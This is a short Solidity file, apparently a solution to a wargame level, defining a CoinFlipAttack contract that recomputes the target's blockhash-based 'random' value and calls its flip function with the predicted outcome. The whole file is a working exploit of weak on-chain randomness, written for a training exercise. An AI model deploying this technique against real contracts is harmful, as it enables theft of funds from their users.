// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../lessons/03-CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private immutable coinFlip;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function getResult() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 flip = blockValue.div(FACTOR);
        bool result = flip == 1;
        return result;
    }

    function attack() public {
        bool result = getResult();
        coinFlip.flip(result);
    }
}
